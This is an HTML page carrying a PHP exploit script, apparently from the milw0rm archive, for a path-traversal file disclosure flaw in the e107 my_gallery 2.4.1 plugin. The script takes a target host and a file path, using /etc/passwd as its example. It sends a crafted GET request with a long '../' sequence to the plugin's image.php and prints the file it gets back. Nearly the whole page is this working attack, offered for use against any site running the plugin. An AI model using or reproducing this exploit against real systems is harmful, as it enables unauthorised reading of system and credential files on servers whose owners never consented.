<html><head><title>e107 Plugin my_gallery 2.4.1 readfile() Local File Disclosure Exploit</title></head><pre>&lt;?php

/*

============================================
[o] e107 Plugin my_gallery 2.4.1 Exploit [o]
============================================

Bug [f]ound by NoGe - noge.code@gmail.com
Exploit [c]oded by Vrs-hCk - d00r@telkom.net

* Plugin my_gallery create photo gallery.
* Powered by Highslide JS script.
* With random gallery menu and navigation menu.
* Has a comment system, ratings and search of images.

Download e107 my_gallery 2.4.1 Plugin
http://code.google.com/p/e107mygalleryplugin/downloads/list


=============
[o] Usage [o]
=============

Web 2 XPL &lt;&lt; fill with site who use e107 Plugin my_gallery
File 2 Read &lt;&lt; fill with file or directory you want to read

Web 2 XPL : www.contoh.com
File 2 Read : /etc/passwd

Then Go!!!


==============
[o] Greetz [o]
==============

MainHack BrotherHood [ http://news.serverisdown.org ]
Vrs-hCk OoN_BoY Paman bL4Ck_3n91n3 Angela Zhang
H312Y yooogy mousekill }^-^{ loqsa zxvf martfella
skulmatic OLiBekaS ulga Cungkee k1tk4t str0ke

FUCK TERORIS!!

*/

$vuln  = '/e107_plugins/my_gallery/image.php?file=';
$trasv = '/../../../../../../../../../../../../../../..';

echo &quot;&lt;form method=POST&gt;
Web 2 XPL : &lt;input type=\&quot;text\&quot; name=\&quot;host\&quot; size=30&gt;
File 2 Read : &lt;input type=\&quot;text\&quot; name=\&quot;file\&quot; size=30&gt;
&lt;input type=submit value=\&quot;Go!!!\&quot; name=\&quot;_xpl\&quot;&gt;
&lt;br&gt;&lt;br&gt;&quot;;

if ($_POST['_xpl']) {
	$data .= &quot;GET /{$vuln}{$trasv}{$file} HTTP/1.1\r\n&quot;;
	$data .= &quot;Host: {$host}\r\n&quot;;
	$data .= &quot;Connection: close\r\n\r\n&quot;;
	$html  = sendpacket($host,$data);
	print '&lt;pre&gt;'.htmlspecialchars($html).'&lt;/pre&gt;';
}

echo &quot;&lt;/form&gt;&quot;;

function sendpacket($host,$data) {
	if (!$sock = @fsockopen($host,80)) {
		die(&quot;[!] Connection refused, try again!\n&quot;);
	}
	fputs($sock,$data);
	while (!feof($sock)) { $html .= fgets($sock); }
	fclose($sock);
	return $html;
}

?&gt;

# milw0rm.com [2009-07-23]</pre></html>